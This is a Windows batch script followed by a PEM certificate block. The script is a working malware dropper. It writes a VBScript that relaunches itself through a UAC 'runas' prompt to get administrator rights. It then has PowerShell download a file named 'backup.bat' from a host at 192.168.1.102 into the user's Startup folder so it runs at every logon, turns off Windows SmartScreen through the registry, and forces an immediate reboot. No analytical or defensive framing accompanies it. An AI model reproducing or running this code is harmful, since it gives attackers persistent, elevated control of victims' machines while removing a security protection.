@echo off
set "batchPath=%~0"
setlocal DisableDelayedExpansion
set "vbsGetPrivileges=%temp%\OEgetPrivileges.vbs"
setlocal EnableExtensions

:: Batch script start
echo Set UAC = CreateObject^("Shell.Application"^) > "%vbsGetPrivileges%"
echo args = "" >> "%vbsGetPrivileges%"
echo For Each strArg in WScript.Arguments >> "%vbsGetPrivileges%"
echo args = args & """" & strArg & """" & " " >> "%vbsGetPrivileges%"
echo Next >> "%vbsGetPrivileges%"

if '%cmdCmd%'=='-1' goto getPrivileges
if '%cmdCmd%'=='1' goto gotPrivileges

:getPrivileges
    set "cmdCmd=1"
    setlocal DisableDelayedExpansion
    cscript //nologo "%vbsGetPrivileges%" %*
    if '%errorlevel%'=='9009' (  echo GetPrivileges requires administrator privileges.  echo Requesting administrative privileges...  goto UACPrompt  ) else (  if '%errorlevel%'=='0' (    echo ELEVATED - Proceeding with script  ) else (    echo The attempt to get administrative privileges failed.  )
  )
  goto gotPrivileges

:UACPrompt
    setlocal DisableDelayedExpansion
    set "batchPath=%~0"
    set "batchArgs="
    for %%x in (%*) do set "batchArgs=!batchArgs! "%%x""
    setlocal EnableDelayedExpansion
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\OEgetPrivileges.vbs"
    echo UAC.ShellExecute "cmd.exe", "/c ""!batchPath! !batchArgs!""", "", "runas", 1 >> "%temp%\OEgetPrivileges.vbs"
    "%temp%\OEgetPrivileges.vbs" %*
    exit /B

:gotPrivileges
    if exist "%vbsGetPrivileges%" del "%vbsGetPrivileges%"


powershell -Command "Invoke-WebRequest -Uri 'http://192.168.1.102:80/backup.bat' -OutFile 'C:\Users\syedh\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\baaackup.bat'; reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer /v SmartScreenEnabled /t REG_DWORD /d 0 /f; shutdown /r /t 0"
-----BEGIN CERTIFICATE-----
MIIDzzCCArcCFByORmdcATJzndGO9crH3co8W3eFMA0GCSqGSIb3DQEBCwUAMIGj
MQswCQYDVQQGEwJVUzERMA8GA1UECAwITmV3IFlvcmsxLjAsBgNVBAcMJTQ3IFcg
MTN0aCBTdCwgTmV3IFlvcmssIE5ZIDEwMDExLCBVU0ExDjAMBgNVBAoMBW9ydm94
MQswCQYDVQQLDAJobjENMAsGA1UEAwwESmhvbjElMCMGCSqGSIb3DQEJARYWeGls
ZWZlODc3MEB3aXNuaWNrLmNvbTAeFw0yMzEwMjUwNjAzNTlaFw0yNDEwMjQwNjAz
NTlaMIGjMQswCQYDVQQGEwJVUzERMA8GA1UECAwITmV3IFlvcmsxLjAsBgNVBAcM
JTQ3IFcgMTN0aCBTdCwgTmV3IFlvcmssIE5ZIDEwMDExLCBVU0ExDjAMBgNVBAoM
BW9ydm94MQswCQYDVQQLDAJobjENMAsGA1UEAwwESmhvbjElMCMGCSqGSIb3DQEJ
ARYWeGlsZWZlODc3MEB3aXNuaWNrLmNvbTCCASIwDQYJKoZIhvcNAQEBBQADggEP
ADCCAQoCggEBAOOZ/6ZlWEjjCTMjOJJdeJyib3oyZ1nuR1qDAOZVIzP/xHsZ3tu0
7VL1zy8DfCEUR5THdMV++3/59hB7YdrysFeL0iLBsGUpCHbR12l1yFD2jDuXevPd
wXrxj0QGnktOQBsRreXDD0bKDYV0maBMXcvVaU8p2q5bemDIe39ZQTCU3r6UliJ5
kjLvYCKvOWwVTpJ5pVDtiqMck8I+dRavAdDFxUPY0R3ozDqZeelBaRYg+/B5Z7mW
o5n6UwgUqhCNZFZbVBAYOmRDP8uvkJTUfulSwvlktUrEdVCIEUudx00kXXDu2mgC
HyTqtbFBsdgPukNF0GousY3IlO+aBDzRMu8CAwEAATANBgkqhkiG9w0BAQsFAAOC
AQEAh79gJqk2j06zRAyS/Ug9V2iDwZ1ArZLDcWRaGqjdSE8FlFQoDaEfP3IqMKg+
2dohEk0AORnwQdi3cHAqoWQwzK0ejXKhPiT7p/aec+HyqEq7PEG9eal65LLtENNN
czjI1vJF3Q5fA5YU8BpoTq1m5TgKjqAM/m19e/1HoyDjJuACe5ljrVDowEufF/lZ
ulzSs5DaF7zZRVxsfZrSfQt49KR3cwnVMuO1CbQWqmt+GkWMg7NS5wU/qTlPB+v7
z0KX7yHZID8s0DPIBCQL6KBPG+5XIsSJpV2KkUVRNj1YBchrfUslcxXWyfp4rA5w
70edhya6H+6IbNglSHTWCu51VQ==
-----END CERTIFICATE-----
